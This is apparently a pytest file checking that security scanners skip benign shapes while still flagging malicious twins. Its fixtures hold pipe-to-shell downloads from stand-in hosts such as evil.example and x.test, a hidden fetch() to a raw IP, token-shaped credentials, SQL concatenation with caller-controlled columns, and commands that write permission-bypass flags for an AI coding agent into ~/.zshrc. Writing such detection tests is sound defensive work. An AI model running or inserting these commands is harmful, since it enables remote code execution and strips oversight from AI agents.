"""False-positive hardening found by scanning Token Optimizer and Outsourcerer.

Every benign shape is paired with a malicious twin that must still be reported,
so a rule is never quieter than it was for the attack it exists to catch.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))

import scan_mcp_security  # noqa: E402
import scan_sast  # noqa: E402
import scan_secrets  # noqa: E402
import scan_skill_threats  # noqa: E402


def _write(tmp_path, rel, text):
    path = tmp_path / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding='utf-8')
    return str(path), rel


def _rules(findings):
    return sorted((f.rule_id, f.line) for f in findings)


def _titles(findings):
    return sorted((f.title, f.line, f.severity) for f in findings)


# --- hardcoded IPs --------------------------------------------------------

def _ips(findings):
    return sorted((f.line, round(f.confidence, 2)) for f in findings if f.rule_id == 'SC-NET-001')


def test_loopback_unspecified_and_remote_ips_all_still_reported(tmp_path):
    p, r = _write(tmp_path, 'a.txt', 'bind 127.0.0.1\nhost = 0.0.0.0\nbeacon 203.0.113.9\n')
    assert _ips(scan_secrets.scan_file(p, r)) == [(1, 0.3), (2, 0.3), (3, 0.3)]


def test_version_runs_and_svg_geometry_not_reported(tmp_path):
    p, r = _write(tmp_path, 'v.txt', 'build 1.2.3.4.5\n')
    assert not _ips(scan_secrets.scan_file(p, r))
    p, r = _write(tmp_path, 'a.svg', '<path d="M047.1.093.2 L05.158.034.087"/>\n')
    assert not _ips(scan_secrets.scan_file(p, r))


def test_hidden_addresses_in_svg_xml_html_still_reported(tmp_path):
    cases = {
        'a.svg': ['<script>fetch("http://010.0.0.1/x")</script>\n',
                  '<a href="http://203.0.113.9/x">t</a>\n',
                  '<text>010.0.0.1</text>\n',
                  '<path d="M1 1" data-h="010.0.0.1"/>\n'],
        'a.xml': ['<host>010.0.0.1</host>\n', '<p x="010.0.0.1"/>\n'],
        'b.html': ['<script>fetch("http://203.0.113.9/x")</script>\n'],
        'c.txt': ['go 203.0.113.9.evil.example\n'],
    }
    for name, lines in cases.items():
        for line in lines:
            p, r = _write(tmp_path, name, line)
            assert _ips(scan_secrets.scan_file(p, r)), (name, line)


# --- ladder fixtures ------------------------------------------------------

def test_ladder_shaped_tokens_still_detected_everywhere(tmp_path):
    # Content shape alone does not prove a token is inert: usable low-entropy
    # credentials must keep firing, in tests/ and outside it.
    body = ('k = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"\n'
            'a = "AKIAABCDEFGHIJKLMNOP"\n'
            's = "xoxb-1234567890"\n')
    for name in ('tests/test_x.py', 'src/app.py'):
        p, r = _write(tmp_path, name, body)
        found = {f.line for f in scan_secrets.scan_file(p, r)
                 if f.rule_id in ('SC-SEC-017', 'SC-SEC-001', 'SC-SEC-011')}
        assert found == {1, 2, 3}, name


def test_random_or_mixed_tail_still_reported(tmp_path):
    body = ('k = "ghp_ABCDEFGHIJKL9x8Qw7Er6Ty5Ui4Op3As2Df1"\n'
            'a = "AKIAIOSFODNN7XQ2LM4Z"\n'
            's = "xox' + 'b-1234567890-0987654321-AbCdEfGhIjKlMnOpQrStUvWx"\n')
    p, r = _write(tmp_path, 'real.py', body)
    found = {f.line for f in scan_secrets.scan_file(p, r)
             if f.rule_id in ('SC-SEC-017', 'SC-SEC-001', 'SC-SEC-011')}
    assert found == {1, 2, 3}


def test_ladder_embedded_in_longer_token_still_reported(tmp_path):
    p, r = _write(tmp_path, 'a.py', 'k = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789zQ"\n')
    assert [f for f in scan_secrets.scan_file(p, r) if f.rule_id == 'SC-SEC-017']


# --- SQL concatenation ----------------------------------------------------

_SQL_OK = '''
def stats(conn, by_day):
    day_col = "substr(ts, 1, 10)" if by_day else "NULL"
    return conn.execute("SELECT " + day_col + ", COUNT(*) FROM t GROUP BY 1")
'''

_SQL_BAD = '''
def stats(conn, col):
    day_col = col
    return conn.execute("SELECT " + day_col + ", COUNT(*) FROM t GROUP BY 1")

def stats2(conn, col, flag):
    day_col = "a" if flag else col
    return conn.execute("SELECT " + day_col + ", COUNT(*) FROM t GROUP BY 1")
'''


def test_sql_literal_choice_not_reported(tmp_path):
    p, r = _write(tmp_path, 'm.py', _SQL_OK)
    assert not [f for f in scan_mcp_security.scan_file(p, r) if f.rule_id.startswith('SM-SQL')]


def test_sql_caller_controlled_column_reported(tmp_path):
    p, r = _write(tmp_path, 'm.py', _SQL_BAD)
    lines = {f.line for f in scan_mcp_security.scan_file(p, r) if f.rule_id.startswith('SM-SQL')}
    assert lines == {4, 8}


_SQL_AUG_OK = (
    'def q(conn, by_day, uid):\n'
    '    day = "substr(ts, 1, 10)" if by_day else "NULL"\n'
    '    where = "WHERE ts >= ? "\n'
    '    if uid:\n'
    '        where += "AND (u = ? OR v = ?) "\n'
    '    return conn.execute(\n'
    '        "SELECT " + day + ", kind FROM t " + where +\n'
    '        "GROUP BY " + ("1, " if by_day else "") + "kind", ())\n')

_SQL_AUG_BAD = (
    'def q(conn, by_day, extra):\n'
    '    where = "WHERE ts >= ? "\n'
    '    where += extra\n'
    '    return conn.execute("SELECT kind FROM t " + where, ())\n'
    '\n'
    'def r(conn, by_day, col):\n'
    '    return conn.execute("SELECT " + ("a" if by_day else col) + " FROM t", ())\n')


def test_sql_augassign_and_inline_ifexp_static_not_reported(tmp_path):
    p, r = _write(tmp_path, 'm.py', _SQL_AUG_OK)
    assert not [f for f in scan_mcp_security.scan_file(p, r) if f.rule_id.startswith('SM-SQL')]


def test_sql_augassign_with_caller_text_or_dynamic_branch_reported(tmp_path):
    p, r = _write(tmp_path, 'm.py', _SQL_AUG_BAD)
    lines = {f.line for f in scan_mcp_security.scan_file(p, r) if f.rule_id.startswith('SM-SQL')}
    assert {4, 7} <= lines


# --- dataflow env= --------------------------------------------------------


# --- shell message strings -------------------------------------------------

def _sast(tmp_path, text, name='x.sh'):
    p, r = _write(tmp_path, name, text)
    return scan_sast.scan_file(p, r)



def test_bypass_flag_as_argument_or_mode_still_reported(tmp_path):
    text = ('aflag=(--sandbox --dangerously-skip-permissions)\n'
            'dangerous) mode="bypassPermissions"; posture="DANGER" ;;\n'
            'echo "go now with the whole team ok"; claude --dangerously-skip-permissions\n'
            'echo "alias c=\'claude --dangerously-skip-permissions -p x for the lazy day\'" >> ~/.zshrc\n'
            'echo "run this one now please with bypassPermissions flag on" | sh\n'
            'echo "now $(claude --dangerously-skip-permissions -p hi there friends ok)"\n')
    got = [f for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-026']
    assert {f.line for f in got} == {1, 2, 3, 4, 5, 6}
    assert all(f.severity == 'critical' for f in got)


def test_printed_bypass_instruction_keeps_severity(tmp_path):
    # echoed instructions can coerce a human; no masking of printed text
    got = [f for f in _sast(tmp_path, 'echo "re-run with --dangerously-skip-permissions to continue"\n')
           if f.rule_id == 'SA-SH-026']
    assert got and all(f.severity != 'low' for f in got)



def test_case_arm_alternation_is_not_a_pipe(tmp_path):
    text = ('case "$x" in\n'
            "  ''|bash|zsh|sh|dash|login) return 0 ;;\n"
            'esac\n'
            'curl -s http://x.test/i | bash\n'
            'case "$y" in a) curl http://x|sh ;; esac\n'
            '(curl -s http://x.test/i|sh)\n'
            '(curl|sh)\n'
            '(wget|bash)\n'
            'x=(curl|sh)\n')
    lines = {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'}
    assert lines == {4, 5, 6, 7, 8, 9}



def test_brace_expanded_pipe_to_shell_is_not_a_case_arm(tmp_path):
    # `{curl,-s,url}|sh)` closing a subshell is a real download piped to a shell.
    twin = '(\n{curl,-s,https://evil.example/x}|sh)\n'
    assert {f.line for f in _sast(tmp_path, twin) if f.rule_id == 'SA-SH-003'} == {2}
    # Same shape, even inside a real case block: braces and commas never make an arm.
    inside = 'case "$x" in\n  a) (\n{curl,-s,https://evil.example/x}|sh) ;;\nesac\n'
    assert 3 in {f.line for f in _sast(tmp_path, inside) if f.rule_id == 'SA-SH-003'}


def test_arm_shape_outside_any_case_block_is_reported(tmp_path):
    text = '(\ncurl|sh)\nwget|bash)\n'
    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {2, 3}


def test_arm_after_a_closed_case_block_is_reported(tmp_path):
    text = ('case "$x" in\n  a|b) echo hi ;;\nesac\n'
            '(\ncurl|sh)\n')
    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {5}


def _st(tmp_path, text, name):
    return scan_skill_threats.scan_content(text, name)





# --- importlib.reload --------------------------------------------------------

_RELOAD = '''import importlib
import json

def f():
    mod = importlib.import_module("thrash_guard")
    importlib.reload(mod)

def g(name):
    m = importlib.import_module(name)
    importlib.reload(m)

def h(x):
    importlib.reload(x)

def k():
    importlib.reload(json)
    other = load_something()
    importlib.reload(other)
'''


def _reload(findings):
    return {f.line: f.severity for f in findings if 'Reload' in f.title}





def test_arm_shape_inside_an_arm_body_is_reported(tmp_path):
    # only a line right after `in` or `;;` can be an arm; a body line cannot
    text = 'case x in\n a) echo 1\n (\ncurl|sh)\n;;\nesac\n'
    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {4}


def test_brace_pattern_list_is_never_skipped_even_at_an_arm_position(tmp_path):
    # defence in depth: braces/commas keep the finding even right after `in` or `;;`
    text = 'case x in\n{curl,-s,https://evil.example/x}|sh) ;;\nesac\n'
    assert {f.line for f in _sast(tmp_path, text) if f.rule_id == 'SA-SH-003'} == {2}
